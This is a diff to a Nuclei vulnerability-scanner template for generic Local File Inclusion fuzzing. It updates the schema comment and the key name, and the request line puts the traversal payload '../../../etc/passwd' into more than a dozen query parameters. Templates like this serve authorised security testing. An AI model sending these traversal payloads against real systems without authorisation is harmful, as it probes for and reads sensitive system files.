@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: generic-lfi-fuzzing
 info:
   name: Generic LFI Test
@@ -6,7 +7,7 @@ info:
   description: A generic test for Local File Inclusion
   tags: fuzz,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?q=../../../etc/passwd&s=../../../etc/passwd&search=../../../etc/passwd&id=&action=../../../etc/passwd&keyword=../../../etc/passwd&query=../../../etc/passwd&page=../../../etc/passwd&keywords=../../../etc/passwd&url=../../../etc/passwd&view=../../../etc/passwd&cat=../../../etc/passwd&name=../../../etc/passwd&key=../../../etc/passwd&p=../../../etc/passwd"
